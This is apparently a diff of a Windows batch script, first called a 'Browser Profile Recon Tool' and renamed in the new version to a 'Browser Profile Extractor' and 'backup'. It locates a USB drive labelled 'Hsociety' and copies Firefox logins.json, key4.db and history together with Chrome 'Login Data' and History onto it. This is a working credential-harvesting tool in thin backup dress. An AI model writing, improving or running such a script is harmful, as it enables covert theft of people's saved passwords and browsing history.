@@ -1,63 +1,76 @@
 @echo off
-:: Batch script to copy important Firefox and Chrome profiles data to USB automatically
-:: BANNER
-echo.
-echo    ██╗  ██╗███████╗ ██████╗  ██████╗ ██████╗ ██╗████████╗██╗   ██╗
-echo    ██║  ██║██╔════╝██╔═══██╗██╔════╝ ██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
-echo    ███████║█████╗  ██║   ██║██║  ███╗██████╔╝██║   ██║    ╚████╔╝ 
-echo    ██╔══██║██╔══╝  ██║   ██║██║   ██║██╔═══╝ ██║   ██║     ╚██╔╝  
-echo    ██║  ██║███████╗╚██████╔╝╚██████╔╝██║     ██║   ██║      ██║   
-echo    ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝   ╚═╝      ╚═╝   
-echo.
-echo                [ Browser Profile Recon Tool By Hsociety ]
-echo.
+setlocal EnableExtensions EnableDelayedExpansion
 
-:: Set the label of your USB drive
-set USB_LABEL=Hsociety
+:: ===============================
+:: ProfilesBackup v1.1
+:: Wsuits6 Browser Profile Extractor
+:: ===============================
 
-:: Detect USB drive letter by label
-for /f "skip=1 tokens=2 delims== " %%i in ('wmic volume where "label='%USB_LABEL%'" get DriveLetter /value') do (
-    set USB_DRIVE=%%i
+:: ---- CONFIG ----
+set "USB_LABEL=Hsociety"
+set "BASE_DIR=ProfilesBackup"
+
+set "FIREFOX_BASE=%APPDATA%\Mozilla\Firefox\Profiles"
+set "CHROME_BASE=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
+
+:: ---- Detect USB drive ----
+for /f "skip=1 tokens=1,2" %%A in ('wmic logicaldisk get Name^,VolumeName') do (
+    if /I "%%B"=="%USB_LABEL%" set "USB_DRIVE=%%A"
 )
 
-:: Check if the USB drive was detected
-if "%USB_DRIVE%"=="" (
-    echo USB drive with label "%USB_LABEL%" not found.
+if not defined USB_DRIVE (
+    echo [!] USB drive with label "%USB_LABEL%" not found.
     pause
-    exit /b
+    exit /b 1
+)
+
+:: ---- Safe timestamp ----
+for /f %%i in ('wmic os get localdatetime ^| find "."') do set dt=%%i
+set "TIMESTAMP=%dt:~0,4%-%dt:~4,2%-%dt:~6,2%_%dt:~8,2%-%dt:~10,2%-%dt:~12,2%"
+
+set "OUTDIR=%USB_DRIVE%\%BASE_DIR%\Backup_%TIMESTAMP%"
+set "LOGFILE=%OUTDIR%\backup.log"
+
+mkdir "%OUTDIR%" >nul 2>&1
+
+:: ---- Banner (now earned) ----
+echo.
+echo ███████╗███████╗██╗   ██╗██╗████████╗███████╗
+echo ██╔════╝██╔════╝██║   ██║██║╚══██╔══╝██╔════╝
+echo ███████╗███████╗██║   ██║██║   ██║   ███████╗
+echo ╚════██║╚════██║██║   ██║██║   ██║   ╚════██║
+echo ███████║███████║╚██████╔╝██║   ██║   ███████║
+echo ╚══════╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝
+echo.
+echo [+] USB detected: %USB_DRIVE%
+echo [+] Output directory: %OUTDIR%
+echo.
+
+:: ---- Firefox ----
+if exist "%FIREFOX_BASE%" (
+    echo [+] Copying Firefox profiles...
+    for /d %%P in ("%FIREFOX_BASE%\*") do (
+        set "FF_OUT=%OUTDIR%\Firefox\%%~nP"
+        mkdir "!FF_OUT!" >nul 2>&1
+
+        robocopy "%%P" "!FF_OUT!" places.sqlite logins.json key4.db prefs.js /NFL /NDL /NJH /NJS /NC /NS >> "%LOGFILE%"
+    )
 ) else (
-    echo USB drive detected: %USB_DRIVE%
+    echo [-] Firefox not found. >> "%LOGFILE%"
 )
 
-:: Create a folder on USB to store the copied profiles
-if not exist "%USB_DRIVE%\ProfilesBackup" mkdir "%USB_DRIVE%\ProfilesBackup"
+:: ---- Chrome ----
+if exist "%CHROME_BASE%" (
+    echo [+] Copying Chrome profile...
+    set "CH_OUT=%OUTDIR%\Chrome"
+    mkdir "%CH_OUT%" >nul 2>&1
 
-:: Create a timestamped folder for this backup
-setlocal enabledelayedexpansion
-:: Format timestamp to avoid invalid characters (Remove slashes and colons)
-set TIMESTAMP=%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2%_%TIME:~0,2%-%TIME:~3,2%-%TIME:~6,2%
-set TIMESTAMP=!TIMESTAMP: =0!
-
-:: Create timestamped folders
-mkdir "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%"
-
-:: Copy important Firefox files
-echo Copying important Firefox files...
-for /d %%d in ("%APPDATA%\Mozilla\Firefox\Profiles\*") do (
-    mkdir "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Firefox\%%~nd"
-    xcopy "%%d\places.sqlite" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Firefox\%%~nd\" /i /h /y
-    xcopy "%%d\logins.json" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Firefox\%%~nd\" /i /h /y
-    xcopy "%%d\key4.db" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Firefox\%%~nd\" /i /h /y
-    xcopy "%%d\prefs.js" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Firefox\%%~nd\" /i /h /y
+    robocopy "%CHROME_BASE%" "%CH_OUT%" Bookmarks "Login Data" Preferences History /NFL /NDL /NJH /NJS /NC /NS >> "%LOGFILE%"
+) else (
+    echo [-] Chrome not found. >> "%LOGFILE%"
 )
 
-:: Copy important Chrome files
-echo Copying important Chrome files...
-mkdir "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Chrome"
-xcopy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Chrome\" /i /h /y
-xcopy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Chrome\" /i /h /y
-xcopy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Chrome\" /i /h /y
-xcopy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\History" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Chrome\" /i /h /y
-
-echo Important profiles copied successfully to %USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%
+echo.
+echo [+] Backup complete.
+echo [+] Log file: %LOGFILE%
 pause
